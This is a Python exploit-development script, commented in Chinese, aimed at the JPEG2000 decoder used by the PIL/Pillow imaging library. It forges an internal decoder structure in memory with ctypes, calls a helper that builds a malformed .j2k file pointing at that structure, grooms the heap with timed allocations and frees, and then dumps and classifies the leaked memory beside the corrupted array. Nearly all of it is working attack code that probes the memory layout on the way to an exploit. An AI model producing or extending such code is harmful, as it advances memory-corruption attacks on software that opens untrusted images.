#!/usr/bin/env python3
# 看新邻居：新 payload 布局下，数组 +0x230 起的 6KB 窗口里到底是什么
#   · 用合法 FAKE（A=FAKE-0x0c）=> 不崩
#   · fake.data 指向 scratch => 写入无害
#   · 之后从插桩日志里把窗口里的 qword 全打印出来并做类型注释
import ctypes, gc, io, re, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
HOLD = []


def low_buffer(n):
    for _ in range(64):
        b = bytearray(n)
        v = (ctypes.c_char * n).from_buffer(b)
        HOLD.append((b, v))
        a = ctypes.addressof(v)
        if a < 0x1000000:
            return b, a
    raise RuntimeError('no low buffer')


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def put32(a, v):
    ctypes.c_uint32.from_address(a).value = v & 0xFFFFFFFF


SCR_O, SCRATCH = low_buffer(8192)
RES_O, RESADDR = low_buffer(4096)
FAKE_O, FAKE = low_buffer(4096)
print("[*] SCRATCH=%#x RES=%#x FAKE=%#x" % (SCRATCH, RESADDR, FAKE))

# 伪造 tilecomp：data -> SCRATCH
put64(FAKE + 0x10, 1)
put64(FAKE + 0x18, 1)
put64(FAKE + 0x20, RESADDR)
put64(FAKE + 0x28, 40)
put64(FAKE + 0x30, SCRATCH)
put64(FAKE + 0x38, 0)
put64(FAKE + 0x40, 4096)
put64(FAKE + 0x48, 4096)
put64(FAKE + 0x70, 256)
put32(RESADDR + 0x08, 16)
put32(RESADDR + 0x0c, 16)
put32(RESADDR + 0x10, 1)
put32(RESADDR + 0x14, 1)

A = FAKE - 0x0c
r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/data8.j2k', '/tmp/NN.j2k', '0', '23',
                    hex(A), hex(A + 0x1000), hex(A + 0x4000), '-370'],
                   capture_output=True, text=True)
print("[*] build:", (r.stdout + r.stderr).strip()[:60])
if 'OK' not in r.stdout:
    sys.exit(1)

# groom + 解码（子进程里做，便于抓插桩日志）
LOG = '/tmp/neigh.log'
pid = os.fork() if False else None
import os
pid = os.fork()
if pid == 0:
    fd = os.open(LOG, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
    os.dup2(fd, 2)
    gc.collect()
    prime = [bytes(519) for _ in range(1024)]
    del prime
    pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
    good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
    keep = [t for i, t in enumerate(good) if i != len(good) // 2]
    Ks = [B for (D, B) in keep]
    holeD = good[len(good) // 2][0]
    del holeD, pairs, good
    gc.collect()
    try:
        M = open('/tmp/NN.j2k', 'rb').read()
        im = Image.open(io.BytesIO(M)); im.load()
        os.write(1, ("DECODE OK %s\n" % (im.size,)).encode())
    except BaseException as e:
        os.write(1, ("DECODE ERR %r\n" % (e,)).encode())
    os._exit(0)
os.waitpid(pid, 0)

log = open(LOG, errors='ignore').read()
# 拿数组地址
arr = None
for ln in log.splitlines():
    m = re.search(r'tp_index=(0x[0-9a-f]+)', ln)
    if m:
        arr = int(m.group(1), 16)
        break
print("[*] tp_index = %#x" % (arr if arr else 0))

# 收集 q[+k] @addr = value
win = {}
for ln in log.splitlines():
    m = re.search(r'q\[\+(\d+)\]\s+@(0x[0-9a-f]+)\s+=\s+(0x[0-9a-f]+)', ln)
    if m:
        win[int(m.group(1))] = int(m.group(3), 16)
print("[*] 窗口内 qword 样本数 = %d" % len(win))


def kind(v):
    if v == 0:
        return "zero"
    if v < 0x1000:
        return "small"
    if 0x400000 <= v < 0x600000:
        return "TEXT(python3)"
    if 0xa00000 <= v < 0xf00000:
        return "DATA/HEAP(low)"
    if 0x700000000000 <= v <= 0x7fffffffffff:
        return "MMAP/arena"
    if 0xb00000 <= v < 0x1200000:
        return "HEAP"
    return "ptr? %#x" % v


# 只看窗口 (数组 +0x230 起)
base = 0x230 // 8
print("\n%-8s %-20s %s" % ("偏移", "值", "性质"))
shown = 0
for k in sorted(win):
    if k < base:
        continue
    off = k * 8
    if off > 0x1A30:
        break
    v = win[k]
    if v == 0:
        continue
    print("+%#-6x %#-20x %s" % (off, v, kind(v)))
    shown += 1
    if shown > 40:
        print("...")
        break